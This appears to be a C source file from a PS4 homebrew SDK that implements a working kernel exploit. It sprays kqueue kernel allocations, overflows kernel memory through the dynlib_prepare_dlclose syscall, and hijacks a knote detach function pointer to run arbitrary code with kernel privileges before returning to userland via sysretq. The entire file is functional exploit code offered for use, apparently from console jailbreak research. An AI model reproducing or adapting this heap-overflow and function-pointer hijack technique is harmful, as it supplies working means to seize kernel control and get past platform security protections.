#include <stdlib.h>
#include <stdio.h>

#include <setjmp.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/mman.h>

#ifndef _KERNEL
	#define UNDEFKERNEL
	#define _KERNEL
#endif

#include <sys/param.h>
#include <sys/proc.h>
#include <sys/event.h>
#include <sys/kthread.h>
#include <sys/filedesc.h>
#include <sys/ucred.h>

#ifdef UNDEFKERNEL
	#undef _KERNEL
#endif

#include <ps4/internal/kernel.h>
#include <ps4/internal/kernelexploit.h>
#include <ps4/internal/kernelexploitpayload.h>
#include <ps4/internal/asmpayload.h>

#include <ps4/kernel.h>
#include <kernel.h>

enum{ PS4KernelExploitIntermediateCount = 100 };
enum{ PS4KernelExploitChunkSize = 0x8000 };

typedef struct PS4KernelExploitArgument
{
	PS4RunnableMain fn;
	int argc;
	char **argv;
	int ret;
	PS4KernelExploitStatus exploitStatus;
	sigjmp_buf sigjmpbuf;
}
PS4KernelExploitArgument;

//#define DEBUG 1
#ifdef DEBUG
	#define ps4KernelExploitDebug(...) \
		do \
		{ \
			printf(__VA_ARGS__); \
			sleep(1); \
		} \
		while(0)
#else
	#define ps4KernelExploitDebug(...)
#endif

int ps4KernelExploitRaiseFileDescriptor(int number)
{
	int t[number + 1];
	int i, j, fd;

	if((t[0] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		return -1;

	for(i = 1; t[i - 1] < number; ++i)
		t[i] = dup(t[0]);

	fd = -1;
	if(t[i - 1] == number)
		fd = t[--i];

	for(j = 0; j < i; ++j)
		close(t[j]);

	return fd;
}

int ps4KernelExploitAllocate(int fd)
{
	int queue;
	int r;

	if(fd < 0)
		return -1;

	r = sceKernelCreateEqueue(&queue, "exploit");
	if(r != 0)
		return -2;

	r = sceKernelAddReadEvent(queue, fd, 0, NULL);
	if(r != 0)
	{
		sceKernelDeleteEqueue(queue);
		return -3;
	}

	return queue;
}

int ps4KernelExploitFree(int queue)
{
	if(queue < 0)
		return -1;
	//sceKernelDeleteEqueue(queue); // seems not to do the job?! priorly freed raised fd?
	return close(queue);
}

void ps4KernelExploitReturn(struct PS4KernelExploitArgument *arg)
{
	siglongjmp(arg->sigjmpbuf, 1);
	return;
}

void ps4KernelExploitPayload(struct knote *kn)
{
	PS4KernelExploitArgument *a = (PS4KernelExploitArgument *)kn->kn_kq;
	kn->kn_kq = NULL;

	if(a->fn != NULL)
		a->ret = a->fn(a->argc, a->argv);

	// Xfast_syscall
	// movq 0xb0(%%rsp), %%rsp;
	__asm__ volatile(" \
		movq %%gs:0x2a0, %%rsp; \
		subq $0xc0, %%rsp; \
		movq 0x40(%%rsp), %%rbp; \
		movq 0xa8(%%rsp), %%r11; \
		movq %0, %%rcx; \
		movq %1, %%rdi; \
		movq %%gs:0x2a8, %%rsp; \
 		swapgs; \
		sysretq; \
	" : : "r"(ps4KernelExploitReturn), "r"(a));
}

int ps4KernelExploitRun(PS4RunnableMain fn, int argc, char **argv, PS4KernelExploitStatus *status)
{
	struct PS4KernelExploitArgument arg;

	arg.fn = fn;
	arg.argc = argc;
	arg.argv = argv;
	arg.ret = 0;
	arg.exploitStatus = 0;

	int fd = (PS4KernelExploitChunkSize - 0x800) / 8;
	const size_t mapSize = 2 * PS4KernelExploitChunkSize;
	const size_t mapOverflowSize = (0x100000000 + PS4KernelExploitChunkSize) / 4;
	long pageSize = sysconf(_SC_PAGESIZE);

	ps4KernelExploitDebug("Exploit enter\n");

	PS4KernelExploitArgument *a = (PS4KernelExploitArgument *)&arg;

	int intermediates[PS4KernelExploitIntermediateCount], buffer, overflow;
	uint8_t *map;

	struct knote kn = {{0}};
	//struct knlist knl = {{0}};
	struct filterops fo;
	struct klist *kl;

	int i, j, t;

	ps4KernelExploitDebug("Raising fd to %i\n", fd);
	// raise file descriptor
	t = ps4KernelExploitRaiseFileDescriptor(fd);
	if(t != fd)
	{
		a->exploitStatus = PS4KernelExploitStatusFileDescriptorRaiseError;
		goto e1;
	}

	ps4KernelExploitDebug("Allocating %i intermediates\n", PS4KernelExploitIntermediateCount);
	// setup kernel chunks
	for(i = 0; i < PS4KernelExploitIntermediateCount; i++)
	{
		intermediates[i] = ps4KernelExploitAllocate(fd);

		if(intermediates[i] < 0)
		{
			if(i > 0)
				for(j = 0; j < i; j++)
					ps4KernelExploitFree(intermediates[j]);
			a->exploitStatus = PS4KernelExploitStatusIntermediateAllocationError;
			goto e2;
		}
	}

	ps4KernelExploitDebug("Allocating buffer\n");
	// alloc buffer and overflow chunks
	buffer = ps4KernelExploitAllocate(fd);
	if(buffer < 0)
	{
		a->exploitStatus = PS4KernelExploitStatusBufferAllocationError;
		goto e3;
	}

	ps4KernelExploitDebug("Allocating overflow\n");
	overflow = ps4KernelExploitAllocate(fd);
	if(overflow < 0)
	{
		a->exploitStatus = PS4KernelExploitStatusOverflowAllocationError;
		goto e4;
	}

	ps4KernelExploitDebug("\"Closing\" fd %i\n", fd);
	// close raised fd
	if(close(fd) < 0)
	{
		a->exploitStatus = PS4KernelExploitStatusCloseError;
		goto e5;
	}
	t = -1;

	ps4KernelExploitDebug("Freeing buffer\n");
	// free buffer (create space before overflow)
	t = ps4KernelExploitFree(buffer);
	buffer = -1;
	if(t != 0)
	{
		a->exploitStatus = PS4KernelExploitStatusBufferFreeError;
		goto e6;
	}

	ps4KernelExploitDebug("Setting up userland map %zu + %ld\n", mapSize, pageSize);
	// setup userland
	map = mmap(NULL, mapSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if(map == MAP_FAILED)
	{
		a->exploitStatus = PS4KernelExploitStatusMapError;
		goto e7;
	}
	ps4KernelExploitDebug("Mapped to %p\n", map);

	ps4KernelExploitDebug("Partially freeing map at %p %ld\n", map + mapSize, pageSize);
	if(munmap(map + mapSize, pageSize) != 0)
	{
		a->exploitStatus = PS4KernelExploitStatusMunmapSlotError;
		goto e8;
	}

	// prepare overflow
	kl = (struct klist *)(map + PS4KernelExploitChunkSize);
	kn.kn_fop = &fo;
	kn.kn_kq = (struct kqueue *)&arg;
	fo.f_detach = ps4KernelExploitPayload;
	kl[fd].slh_first = &kn;

	ps4KernelExploitDebug("Calling syscall, overflowing\n");
	// overflow
	t = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
	if(t != -1)
	{
		a->exploitStatus = PS4KernelExploitStatusDlCloseError;
		goto e9;
	}

	ps4KernelExploitDebug("Freeing %i intermediates\n", PS4KernelExploitIntermediateCount);
	// free all intermediates
	for(i = 0; i < PS4KernelExploitIntermediateCount; i++)
	{
		t = ps4KernelExploitFree(intermediates[i]);
		intermediates[i] = -1;
		if(t < 0)
		{
			a->exploitStatus = PS4KernelExploitStatusIntermediateFreeError;
			goto e10;
		}
	}

	ps4KernelExploitDebug("Preparing overflow return\n");
	// create return buffer, install syscall
	if(sigsetjmp(a->sigjmpbuf, 1) == 0)
	{
		ps4KernelExploitDebug("Freeing overflow, triggering playload\n");
		// free overflow, trigger playload
		t = ps4KernelExploitFree(overflow);
		if(t < 0)
		{
			a->exploitStatus = PS4KernelExploitStatusOverflowFreeError;
			goto e11;
		}

		a->exploitStatus = PS4KernelExploitStatusOverflowTriggerError;
		goto e12;
	}
	else
		ps4KernelExploitDebug("Returned from triggered playload\n");

	ps4KernelExploitDebug("Unmapping map %p %zu\n", map, mapSize);
	// free map
	if(munmap(map, mapSize) != 0)
	{
		a->exploitStatus = PS4KernelExploitStatusMunmapCleanError;
		goto e13;
	}

	ps4KernelExploitDebug("Exploit exit without error\n");
	goto ret;

	// FIXME: all good?
	e13: e12: e11: e10: e9: e8:
		munmap(map, mapSize + pageSize);
	e7:	e6: e5:
		ps4KernelExploitFree(overflow);
	e4:
		ps4KernelExploitFree(buffer);
	e3:
		for(i = 0; i < PS4KernelExploitIntermediateCount; i++)
			ps4KernelExploitFree(intermediates[i]);
	e2:
		close(t);
	e1:

	ps4KernelExploitDebug("Exploit exit with error %i\n", arg.exploitStatus);

	ret:
	{
		if(status != NULL)
			*status = arg.exploitStatus;

		return arg.ret;
	}
}
